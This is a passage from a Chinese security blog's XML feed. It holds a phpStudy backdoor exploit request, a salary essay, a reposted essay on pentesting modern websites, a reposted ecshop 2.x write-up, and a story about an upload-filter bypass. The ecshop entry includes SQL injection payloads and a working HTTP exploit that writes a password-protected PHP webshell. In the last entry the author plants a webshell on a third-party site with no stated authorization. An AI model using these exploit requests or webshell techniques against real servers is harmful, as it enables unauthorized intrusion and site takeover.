    <content type="html"><![CDATA[<p>请求任意后缀为php的文件</p><p>目标环境为php5.2,5.4,且不能为nts</p><p>存在Accept-Encoding: gzip,deflate</p><p>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</p><p>PayLoad:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/phpinfo.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.1.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate<span class="hljs-attribute">Sec-Fetch-User</span>: ?1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="hljs-attribute">Sec-Fetch-Site</span>: none,<span class="hljs-attribute">accept-charset</span>: c3lzdGVtKCdjYWxjLmV4ZScpOw<span class="hljs-attribute">Accept-Encoding</span>: gzip,deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9</code></pre><p> <img src="/images/20190924_phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell/01.jpg" alt="phpstudy后门利用方法及getshell"></p><p>其他更好玩的思路靠自己去思考</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>莫名的感慨</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E8%8E%AB%E5%90%8D%E7%9A%84%E6%84%9F%E6%85%A8.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E8%8E%AB%E5%90%8D%E7%9A%84%E6%84%9F%E6%85%A8.html</url>
    
    <content type="html"><![CDATA[<p>在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等</p><p>等工作，到手工资又一万了，反而感觉不高了。</p><p>这是一个正常的现象，这是很多大学生进入社会最深切的感受。</p><p>因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。</p><p>俗话说的好，由俭入奢易，由奢入俭难。</p><a id="more"></a><p><strong>一.学生时代的你</strong></p><p>以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。</p><p>况且给到手的钱都是实实在在的零花钱。</p><p>千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。</p><p>学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。</p><p>一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。</p><p>学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，</p><p>一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。</p><p>特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。</p><p>这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。</p><p><strong>二.毕业以后的你</strong></p><p>1.固定开支大</p><p>每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。</p><p>这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。</p><p>还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。</p><p>还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。</p><p>2.社交开支少不了</p><p>工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，</p><p>就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.</p><p>当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.</p><p>3.日常生活水平也提高</p><p>工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。</p><p>4.人情世故少不了</p><p>在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。</p><p>但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。</p><p>网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。</p><p>这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。</p><p>因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。</p><p>因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对现代化网站的渗透测试的思考</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%AF%B9%E7%8E%B0%E4%BB%A3%E5%8C%96%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%80%9D%E8%80%83.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%AF%B9%E7%8E%B0%E4%BB%A3%E5%8C%96%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%80%9D%E8%80%83.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>首先定义本文所说的现代化网站. 现代化网站是指符合以下多个特征的对外服务.</p><ul><li>储存,数据库,网站程序等服务器高度分离</li><li>实现现代化前端技术, 如三大框架, html5新api, websocket</li><li>基于虚拟化技术的服务部署</li><li>使用现代后端框架,如ssm,think5,gin,django</li><li>外部服务高度集成</li><li>多种客户端,包括Android,Ios,windows</li></ul><p>篇幅有限, 不再列举,但相信读者应该能理解笔者的意思.</p><p>不属于现代化网站最典型的例子就是 下载cms,安装lnmp,直接安装网站程序.<br>现在渗透教程基本都是基于不属于现代化网站的假设(实际上我还没发现基于渗透现代化网站假设的教程)</p><a id="more"></a><h3 id="现代化特征对渗透测试的影响"><a href="#现代化特征对渗透测试的影响" class="headerlink" title="现代化特征对渗透测试的影响"></a>现代化特征对渗透测试的影响</h3><p>笔者按自己的思路逐个列举有影响的特征</p><h4 id="CDN-反向代理"><a href="#CDN-反向代理" class="headerlink" title="CDN/反向代理"></a>CDN/反向代理</h4><p>使用了CDN将会隐藏真实IP, 导致常规端口扫描,弱口令扫描全部失效.<br>但可以通过寻找真实ip来解决.<br>反向代理则无解, 甚至可能只把代理服务器暴露于公网.敏感服务全在内网</p><p>对绕过CDN这个问题, 已经有了一定的研究.有了安全工具, 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p><h4 id="数据分离"><a href="#数据分离" class="headerlink" title="数据分离"></a>数据分离</h4><p>上传文件服务器分离,将导致上传webshell技术失效, 很显然文件服务器是不可能执行webshell的. 上传危害最多只能达到上传html</p><h4 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h4><p>之所以专门把websocket作为一点, 是因为感觉websocket属于盲区, burp,浏览器均不支持websocket的渗透测试.</p><h4 id="新的h5-api"><a href="#新的h5-api" class="headerlink" title="新的h5 api"></a>新的h5 api</h4><p>html5提供了新的api,但是这方面的安全问题还没有被开发人员重视.这个可以从hackone平台上的漏洞报告看出.例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www.hackerone.com via PostMessage</a> .</p><p><code>postmessage</code>这类api的输入是不可控的,如果不进行控制, 就是安全问题.</p><h4 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h4><p>使用三大框架(vue,react, angular)的前端, 对后端进行分离. 也就是不再将url参数直接渲染到html,而通过JavaScript操作.反射xss全部失效,常规储存xss在框架的安全性下也变得渺茫.<br>JavaScript操作带来的xss反而变为主流.这也对渗透测试人员阅读JavaScript代码带来了挑战<br>也带来了部分好处,由于在前端操作,后端暴露的接口将会更多.</p><h4 id="后端框架"><a href="#后端框架" class="headerlink" title="后端框架"></a>后端框架</h4><p>应用了框架后,简单注入全部失效,csrf部分失效, <code>id=x</code>这种低级注入消失.出现注入的点趋向二次注入, 编码注入. sqlmap是不提供原生支持的.</p><h4 id="外部服务接入"><a href="#外部服务接入" class="headerlink" title="外部服务接入"></a>外部服务接入</h4><p>对某些功能不自行进行开发,使用其他公司的服务.这部分功能的安全性取决与该公司的安全水平, 不过真挖出漏洞就属于通用0day了.</p><p>由于对接入服务的理解,接入处反而容易出现问题, 比如未预料的异常.(接入开发: ???,这个问题你怎么不在服务上处理.服务开发: ???,这个你怎么不在接入处处理)</p><h4 id="多服务端"><a href="#多服务端" class="headerlink" title="多服务端"></a>多服务端</h4><p>提供了多平台客户端, 这就对渗透测试多平台渗透能力发出了挑战.<br>不但要会web,还要会安卓/ios渗透测试, 反编译(客户端总是会有一些未公开的api).甚至还有IOT</p><h4 id="风控"><a href="#风控" class="headerlink" title="风控"></a>风控</h4><p>好的风控系统 基本阻止了邮箱/短信轰炸.对需要爆破的漏洞也降低了危害.</p><h4 id="无服务器"><a href="#无服务器" class="headerlink" title="无服务器"></a>无服务器</h4><p>Sass(系统即服务), Fass(函数即服务)等各种服务公司不断涌现,  不需要购买服务器就能进行服务.可能出现刚拿下shell,想内网渗透,发现实际上服务是在某Sass上.或者发现服务api是在Fass上的,根本没有服务器</p><h4 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h4><p>docker提供了优秀的服务分离,就算拿到了shell,也只是拿到了容器的shell. 容器虚拟化不一定安全,但是现在对这方面的研究还不是很多, 完全没有对绕过UAC的研究多.</p><h3 id="对安全教程的思考"><a href="#对安全教程的思考" class="headerlink" title="对安全教程的思考"></a>对安全教程的思考</h3><p>现在一些安全教程还是停留在旧时代, <code>&#39; and 1=1</code>,<br><code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础,挖掘思路也很重要.<br>但是随着技术的发展, 渗透和开发技术也会走的更近, 新开发技术的爆发式增长,不可能像列中间件漏洞一样全部写出它们的渗透技术.就算有人写出来,等写出来黄花菜都凉了.<br>安全教程应该更强调编程, 而不是培养只会用扫描器的驻场工程师.令人欣慰的是现在年轻的渗透测试人员大部分都会编程,还不止一门(就笔者圈子来看).</p><h3 id="对安全工具的思考"><a href="#对安全工具的思考" class="headerlink" title="对安全工具的思考"></a>对安全工具的思考</h3><h4 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h4><p>随着技术的扩散,老式扫描器未来会面临失效.不支持浏览器模拟,只会抓a标签的扫描器, 对前后端分离无能为力. 基于流量和基于爬虫的扫描器会合并, 走向模拟获取流量进行扫描的模式<br>对app的扫描器目前不支持对web的渗透测试.</p><h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>现在正是承前启后的时代,旧的开发技术未被淘汰,新的开发技术正在发展, 谁会在这个时代引领潮流, 或是被淘汰.让我们拭目以待吧</p><p>转载自：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=50308">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=50308</a></p><p>觉得文章写出了现在渗透测试这个行业遇到的种种问题。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ecshop2.x代码执行</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01-SQL注入"></a>0x01-SQL注入</h3><p>先看user.php</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.jpg" alt="ecshop2.x代码执行"></p><a id="more"></a><p>$back_act变量来源于HTTP_REFERER，我们可控。</p><p>assign函数用于在模版变量里赋值</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.jpg" alt="ecshop2.x代码执行"></p><p>再看display函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.jpg" alt="ecshop2.x代码执行"></p><p><strong>读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。</strong></p><p>再看insert_mod函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/04.jpg" alt="ecshop2.x代码执行"></p><p>非常关键的一个地方，这里进行了动态调用</p><p>$val传入进来用|分割，参数传入进来时需要被序列化</p><p>再看include/lib_insert.php中的insert_ads函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/05.jpg" alt="ecshop2.x代码执行"></p><p>可以看到这里直接就能注入了</p><p>payload:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/06.jpg" alt="ecshop2.x代码执行"></p><h3 id="0x02-代码执行"><a href="#0x02-代码执行" class="headerlink" title="0x02-代码执行"></a>0x02-代码执行</h3><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/07.jpg" alt="ecshop2.x代码执行"></p><p>继续看fetch函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/08.jpg" alt="ecshop2.x代码执行"></p><p>追踪_eval函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/09.jpg" alt="ecshop2.x代码执行"></p><p>$position_style变量来源于数据库中的查询结构</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/10.jpg" alt="ecshop2.x代码执行"></p><p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/11.jpg" alt="ecshop2.x代码执行"></p><p>payload</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop27`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&#x27;1535678679&#x27;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">/*&#x27; ORDER BY rnd LIMIT */</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><span class="hljs-comment">-- -</span></code></pre><p>函数中有一个判断</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/12.jpg" alt="ecshop2.x代码执行"></p><p>我们 id传入’/*</p><p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/13.jpg" alt="ecshop2.x代码执行"></p><p>var_dump一下</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/14.jpg" alt="ecshop2.x代码执行"></p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/15.jpg" alt="ecshop2.x代码执行"></p><p>再看fetch函数,传入的参数被fetch_str函数处理了</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/16.jpg" alt="ecshop2.x代码执行"></p><p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/17.jpg" alt="ecshop2.x代码执行"></p><pre><code class="hljs php"><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="hljs-string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="hljs-variable">$source</span>);</code></pre><p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p><p>看看select函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/18.jpg" alt="ecshop2.x代码执行"></p><p>第一个字符为$时进入$this-&gt;get_val函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/19.jpg" alt="ecshop2.x代码执行"></p><p>我们$val没有.$又进入make_var函数</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/20.jpg" alt="ecshop2.x代码执行"></p><p>最后这里引入单引号从变量中逃逸</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/21.jpg" alt="ecshop2.x代码执行"></p><p>我们要闭合_var所以最终payload是</p><pre><code class="hljs php">&#123;<span class="hljs-variable">$asd</span><span class="hljs-string">&#x27;];assert(base64_decode(&#x27;</span>ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==<span class="hljs-string">&#x27;));//&#125;xxx</span></code></pre><p>会在网站跟目录生成1.txt 里面内容是getshell</p><p><img src="/images/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/22.jpg" alt="ecshop2.x代码执行"></p><p>GETSHELL exp:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&#x27;/*&quot;;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p>会在网站根目录生成1.php 密码是1337</p><p>文章转载自:<br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Ecshop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一个奇葩的上传点</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9.html</url>
    
    <content type="html"><![CDATA[<p>最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/01.jpg" alt="记一个奇葩的上传点"></p><p>先打开后台看看，发现后台还是挺炫酷的。</p><a id="more"></a><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/02.jpg" alt="记一个奇葩的上传点"></p><p>用帐号密码登录进后台，找到了上传的地方。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/03.jpg" alt="记一个奇葩的上传点"></p><p>打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/04.jpg" alt="记一个奇葩的上传点"></p><p>继续做测试，把文件名改成1.php;mp4</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/05.jpg" alt="记一个奇葩的上传点"></p><p>然后访问一下该页面，发现显示的是源码。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/06.jpg" alt="记一个奇葩的上传点"></p><p>接下来上传了一个1.rar;mp4。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/07.jpg" alt="记一个奇葩的上传点"></p><p>访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。</p><p>接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/08.jpg" alt="记一个奇葩的上传点"></p><p>陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/09.jpg" alt="记一个奇葩的上传点"></p><p>于是我把php删除了，然后奇迹发生了。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/10.jpg" alt="记一个奇葩的上传点"></p><p>我访问看看，发现可以正常访问的。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/11.jpg" alt="记一个奇葩的上传点"></p><p>于是很激动的发给V哥这个地址，但是他却打不开。。。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/12.jpg" alt="记一个奇葩的上传点"></p><p>至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。</p><p><img src="/images/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/13.jpg" alt="记一个奇葩的上传点"></p><p>后面的就不写了，我把马丢给V哥以后就不管事了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>七年，当我们成为别人的背影时，我们失去了多少</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E4%B8%83%E5%B9%B4%EF%BC%8C%E5%BD%93%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E5%88%AB%E4%BA%BA%E7%9A%84%E8%83%8C%E5%BD%B1%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%A4%B1%E5%8E%BB%E4%BA%86%E5%A4%9A%E5%B0%91.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E4%B8%83%E5%B9%B4%EF%BC%8C%E5%BD%93%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E5%88%AB%E4%BA%BA%E7%9A%84%E8%83%8C%E5%BD%B1%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%A4%B1%E5%8E%BB%E4%BA%86%E5%A4%9A%E5%B0%91.html</url>
    
